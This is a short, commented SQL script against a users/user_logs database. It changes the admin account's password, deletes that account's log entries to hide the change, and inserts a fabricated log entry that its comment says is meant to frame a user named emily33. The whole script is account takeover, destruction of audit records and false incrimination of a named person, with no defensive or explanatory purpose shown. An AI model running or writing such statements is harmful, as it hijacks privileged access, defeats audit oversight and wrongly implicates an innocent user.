-- 1. change admin password to "oops!" (hashed)
UPDATE users
SET password = 'd3c8e06f2c9d0c8b3c6c6a7b5d8f3c1a'
WHERE username = 'admin';

-- 2. delete logs of this change
DELETE FROM user_logs
WHERE user_id = (
    SELECT id FROM users WHERE username = 'admin'
);

-- 3. insert fake log to frame emily33
INSERT INTO user_logs (user_id, message)
VALUES (
    (SELECT id FROM users WHERE username = 'admin'),
    'Password changed to emily33 password'
);
